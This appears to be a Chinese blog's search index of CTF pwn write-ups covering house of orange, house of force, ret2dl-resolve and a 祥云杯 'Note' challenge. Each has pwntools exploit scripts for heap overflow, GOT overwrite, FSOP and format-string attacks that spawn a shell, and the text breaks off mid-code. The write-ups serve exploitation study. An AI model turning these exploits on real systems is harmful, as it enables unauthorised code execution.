class="string">io_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line"><span class="string">system = libc.symbols[&#x27;system&#x27;] + libcbase</span></span><br><span class="line"><span class="string">print &quot;io_list_all: &quot; + hex(io_list_all)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = u64(sh.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap: &quot;</span> + <span class="built_in">hex</span>(heap)</span><br><span class="line">heap_base = heap - <span class="number">0xE0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">-----------------------------------------------------------------------------------------------------</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"><span class="comment">#可以说是一个模板了</span></span><br><span class="line"><span class="comment">#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串</span></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x60</span>) <span class="comment">#size作为0x60，被放入small_bin，从而对应了chain指针</span></span><br><span class="line"><span class="comment">#unsorted bin attack，修改_IO_list_all为main_arena+88</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base + <span class="number">0x5E8</span>)<span class="comment">#vtable ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_file += p64(system) <span class="comment">#__overflow</span></span><br><span class="line">payload += fake_file</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>说一下被注释的地方为啥是错的，因为我们泄露出来的地址是处在 libc 的 data 段</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636081342722980/0278602ef7af7a0bf3e3a3511c415db5139d8e29.png" alt="image-20211105110222421"></p><p>而我们需要的是代码段的基地址，可以看到算出来的 _IO_list_all 地址也是错的</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082226040989/94ed1174b442b72efad937301d15ea8fc26e64f5.png" alt="image-20211105111705852"></p><p>咋整捏，可以直接在 gdb 中找我们需要的函数地址，会发现我们泄露出来的地址和 _IO_list_all 很接近</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-orange/1636082503422977/6ee291b744e13aa10e613abc624b31f40be03b3a.png" alt="image-20211105112143172"></p><p>地址后三位是不会变的，于是想到直接凑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_list_all = (leak &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + (libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>] &amp; <span class="number">0xFFF</span>)</span><br></pre></td></tr></table></figure><p>然后就可以算出 libcbase 了</p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></p><p><a href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/14217309.html">https://www.cnblogs.com/L0g4n-blog/p/14217309.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用之house of force</title>
      <link href="/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/"/>
      <url>/2021/11/01/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-force/</url>
      
        <content type="html"><![CDATA[<p> house of force 是一种堆的利用手法，可以实现内存地址的读写。</p><h2 id="top-chunk-的分割机制"><a href="#top-chunk-的分割机制" class="headerlink" title="top chunk 的分割机制"></a>top chunk 的分割机制</h2><p>top chunk 是堆内存管理器的后备空间，当各 bin 中没有 chunk 可以提供时，top chunk 会分割出一个 chunk 给用户，下面给出分割过程的源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>首先是 libc 会检查用户申请的大小，top chunk 给不给得起；</li><li>如果给得起，就在 top chunk 的 head 处，<strong>以用户申请大小所匹配的 chunk 大小为偏移量，将 top chunk 的位置推到新的位置</strong>，而原来的 top chunk head 处就作为新的堆块被分配给用户了；</li></ol><p>如果我们能控制 top chunk 在这个过程中偏移到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将 top chunk 劫持到任意内存地址，然后就可以控制目标内存。</p><hr><p><strong>简言之</strong></p><ol><li>溢出已经分配的 chunk，覆盖到 top chunk 的 size 位；</li><li>算出 top chunk 与目标地址的距离，将 top chunk 位置推到目标地址</li></ol><h2 id="溢出-top-chunk"><a href="#溢出-top-chunk" class="headerlink" title="溢出 top chunk"></a>溢出 top chunk</h2><p>当我们 malloc 一个堆块，此堆块的下一个就是 top chunk 时，当我们输入的数据大小能够超过申请的大小，就能堆溢出到 top chunk，当我们将 top chunk 的 size 字段改得非常大时就可以通过检查了，一般我们会传入 -1 ，因为 ptmalloc 的源码中对于 size 使用 unsigned long 进行强转抓换，负数用补码表示，将 -1 当成无符号数为 0xffffffffffffffff ，已经非常大了，用于绕过 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) 验证。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>buu 上的 bcloud_bctf_2016</p><p>程序开的保护如下</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635751369496160/0bc4ec261d145b38518a3d6da6e1f2f8604df736.png"></p><p>本题最大的漏洞就在这两个函数中</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635754889755826/752b846ae81dff98b7c487e33f8e70cdb0a50d25.png" alt="image-20211101162129641"></p><h3 id="func1"><a href="#func1" class="headerlink" title="func1"></a>func1</h3><p>s 处输入 0x40 个字符能够覆盖到指针 v2 ，之后的堆地址又赋给了 v2 ，意味着 v2 处 s 的 0截断字符 被覆盖成了堆指针，从而在 strcpy 处可以泄露处可以泄露出堆地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755409091509/ec1d1c267e74848e198785e209c21a650c95c04d.png" alt="image-20211101163008961"></p><h3 id="func2"><a href="#func2" class="headerlink" title="func2"></a>func2</h3><p>也是同理，并且因为 v3 和 s 只相差 4 个字符的缘故，可以修改到 top chunk 的 size 位</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/house-of-force/1635755367270204/f1f8b1e48ac0581bc5e7f13e4eca57ba2b1cdad2.png" alt="image-20211101162927102"></p><p>由于程序没有开 pie ，因此地址之间的偏移可以直接算出来，达到了 house of force 的条件，计算出 top chunk 和 chunk_addr (heap array) 的地址，就可以将 top chunk 指针 指向 heap array 从而控制整个堆指针数组，实现任意地址的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;27866&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;2.23/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">leng,con</span>):</span></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:&#x27;</span>,p32(<span class="number">0xFFFFFFFF</span>))<span class="comment">#修改top chunk的size</span></span><br><span class="line">top_chunk = leak + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;top_chunk: &quot;</span> + <span class="built_in">hex</span>(top_chunk)</span><br><span class="line">chunk_addr = <span class="number">0x0804B120</span></span><br><span class="line">offset = chunk_addr - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">&#x27; &#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在top chunk移到了heap_array_addr-0x8处，我们可以控制heap_array了</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改heap_array</span></span><br><span class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露puts的地址</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">leak = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_got: &quot;</span> + <span class="built_in">hex</span>(leak)</span><br><span class="line">libcbase  = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接</p><p><a href="https://blog.csdn.net/haibiandaxia/article/details/108260537">https://blog.csdn.net/haibiandaxia/article/details/108260537</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/105588058">https://blog.csdn.net/seaaseesa/article/details/105588058</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2dl</title>
      <link href="/2021/10/30/Ret2dl/"/>
      <url>/2021/10/30/Ret2dl/</url>
      
        <content type="html"><![CDATA[<p>挺难的一个知识点，看了两天也只弄懂一点皮毛，感觉还是因为最底层的东西没有弄懂导致理解困难</p><p><strong>使用情景：</strong>libc地址不好泄露，也没有其他的漏洞，但是可以栈溢出</p><p><strong>原理</strong></p><p>首先需要了解ELF文件结构以及动态链接相关知识</p><p>当程序进行动态链接时，为了能够减少资源的浪费动态链接将连接的过程推迟到了运行的时候，当我们第一次调用一个函数的时候，程序会查找需要链接的各种信息，再通过_dl_runtime_resolve这个函数将正确的地址写进got.plt表中，第二次查询的时候就不需要再走一遍这个过程了，直接就可以调用函数（详见参考博客）</p><p>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。</p><p><strong>动态链接过程</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588207298627/20b1708fb00c75422f0e0de71ca3a50c5804b6d8.png" alt="1"></p><p>而整个dl函数的过程入下图所示：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588245719719/d078ccc1c92f9b6d92cc23e5a1e218e31b7ceef0.png" alt="2"></p><p><strong>整个过程说白了就是：</strong></p><ol><li>先从 .rel.plt 表里找到某个函数在 .dynsym 里的偏移</li><li>再从 .dynsym 符号表里找函数在 .dynstr 表里的偏移</li><li>再从 .dynstr 表里找到具体的函数对应的字符串，然后将这个字符串解析成函数 </li></ol><p> <strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong></p><p> <strong>攻击:</strong></p><p>可以看到，整个 dl 函数主要是利用了三个表</p><ul><li>.rel.plt</li><li>.dynsym</li><li>dynstr</li></ul><p>那我们要做的就是伪造这三个表，将我们伪造表的偏移当参数传入，这样它就会解析我们想要的函数了</p><p>当然也可以工具一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context </span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">r.recv() </span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">offset = <span class="number">112</span> </span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>) </span><br><span class="line">buf = rop.fill(offset) </span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) </span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve() </span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) </span><br><span class="line">r.send(buf) buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf) </span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str </span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"> r.send(buf) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p> <strong>参考链接</strong></p><p> <a href="https://blog.csdn.net/qq_41202237/article/details/107378159">https://blog.csdn.net/qq_41202237/article/details/107378159</a></p><p> <a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><p> <a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>祥云杯wp</title>
      <link href="/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/"/>
      <url>/2021/10/30/%E7%A5%A5%E4%BA%91%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>整个程序没有 free 功能，第一时间想到 house of orange</p><p>Say 函数里有 scanf(buf)</p><p>scanf(buf) 可以通过 %n$s 来实现 stack地址上任意书写</p><p>利用 scanf 格式化漏洞改 topchunk 地址从而触发 house of orange</p><p>再利用scanf漏洞在malloc中写入realloc，在realloc中写入og</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;47.104.70.90&quot;,25315)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">con</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say ? &quot;</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x26</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;addr: &quot;</span>)</span><br><span class="line">ad = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) + <span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">&quot;ad: &quot;</span> + <span class="built_in">hex</span>(ad))</span><br><span class="line"></span><br><span class="line">say(<span class="string">&quot;%7$x&quot;</span>+<span class="string">&quot;bbbb&quot;</span>+p64(ad))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0xfd1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span>):</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&quot;bbbbbbbb&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;content:bbbbbbbb&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x108</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">og = libc_base + <span class="number">0x4527a</span><span class="comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;leak_addr: &quot;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook: &quot;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;og: &quot;</span> + <span class="built_in">hex</span>(og))</span><br><span class="line">log.info(<span class="string">&quot;realloc: &quot;</span> + <span class="built_in">hex</span>(realloc))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(og))</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span> + <span class="string">&quot;bbbb&quot;</span> + p64(malloc_hook))</span><br><span class="line">p.recvuntil(<span class="string">&quot;? &quot;</span>)</span><br><span class="line">p.sendline(p64(realloc+<span class="number">13</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;16&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>利用 scanf 格式化 直接打stdout</p><p>利用stdout泄露出libc</p><p>再打利用 scanf 漏洞打exit_hook,从而getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 